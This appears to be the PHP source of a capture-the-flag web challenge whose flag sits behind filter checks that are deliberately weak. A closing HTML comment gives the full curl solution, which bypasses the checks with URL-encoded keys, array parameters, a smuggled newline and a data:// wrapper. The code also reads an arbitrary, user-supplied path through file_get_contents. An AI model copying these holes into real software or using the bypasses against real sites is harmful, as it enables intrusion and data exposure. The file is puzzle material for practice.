<html>
<body>
<!-- ?src -->
</body>

<?php
echo "Null          ...            Null            ...            Null          ...  ".PHP_EOL;

if(isset($_GET['src'])) {
    die(highlight_file('index.php', true));
}

error_reporting(0);

if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
    	//echo $value;
        if(preg_match('/[a-zA-Z]/i', $value))   die('Hello Hack.');     #字母
    }
}

//echo $_SERVER['QUERY_STRING'];
if($_SERVER){
    if(preg_match('/cyber|flag|ciscn/i', $_SERVER['QUERY_STRING']))  die('Hello Hack..');
}

var_dump(preg_match($_GET['ciscn'] !== 'ciscnsec'));
if(isset($_GET['cyber'])){
    if(!(substr($_GET['cyber'], 32) === md5($_GET['cyber']))){ 

        die('Hello Hack...');

    }else{
        if(preg_match('/^ciscnsec$/', $_GET['ciscn']) && $_GET['ciscn'] !== 'ciscnsec'){


            $getflag = file_get_contents($_GET['flag']);
        }else

	die('Hello Hack....');
        if(isset($getflag) && $getflag === 'security'){
            include 'flag.php';
            echo $flag;
        }else die('Hello Hack.....');
    }
?>


<!--curl -g --data "flag=.&cyber=.&ciscn=." "http://localhost:7000/index.php?%63%79%62%65%72[]=1&%63%69%73%63%6e=%63%69%73%63%6esec%0a&%66%6c%61%67=data://text/plain,security"